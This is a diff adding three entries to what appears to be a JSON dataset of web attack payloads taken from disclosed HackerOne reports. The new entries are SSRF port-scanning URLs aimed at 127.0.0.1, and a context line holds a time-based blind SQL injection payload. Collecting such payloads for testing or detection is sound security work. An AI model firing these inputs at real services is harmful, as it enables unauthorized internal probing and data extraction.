@@ -24480,6 +24480,57 @@
     }
   },
   {
+    "id": "f0bfcee6",
+    "class": "ssrf",
+    "payload": "https://127.0.0.1:86",
+    "technique": "SSRF port\u2011scanning via URL input",
+    "param": null,
+    "report": {
+      "id": 2015554,
+      "url": "https://hackerone.com/reports/2015554",
+      "title": "Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports",
+      "program": "Mozilla",
+      "reporter": "harshdranjan",
+      "severity": "none",
+      "bounty": null,
+      "disclosed_at": "2024-01-12"
+    }
+  },
+  {
+    "id": "36f7937e",
+    "class": "ssrf",
+    "payload": "https://127.0.0.1:88",
+    "technique": "SSRF port\u2011scanning via URL input",
+    "param": null,
+    "report": {
+      "id": 2015554,
+      "url": "https://hackerone.com/reports/2015554",
+      "title": "Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports",
+      "program": "Mozilla",
+      "reporter": "harshdranjan",
+      "severity": "none",
+      "bounty": null,
+      "disclosed_at": "2024-01-12"
+    }
+  },
+  {
+    "id": "80951689",
+    "class": "ssrf",
+    "payload": "https://127.0.0.1:87",
+    "technique": "SSRF port\u2011scanning via URL input",
+    "param": null,
+    "report": {
+      "id": 2015554,
+      "url": "https://hackerone.com/reports/2015554",
+      "title": "Internal Blind Server-Side Request Forgery (SSRF) allows scanning internal ports",
+      "program": "Mozilla",
+      "reporter": "harshdranjan",
+      "severity": "none",
+      "bounty": null,
+      "disclosed_at": "2024-01-12"
+    }
+  },
+  {
     "id": "6d900e96",
     "class": "sqli",
     "payload": "https:/\u2588\u2588\u2588\u2588\u2588\u2588/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896",
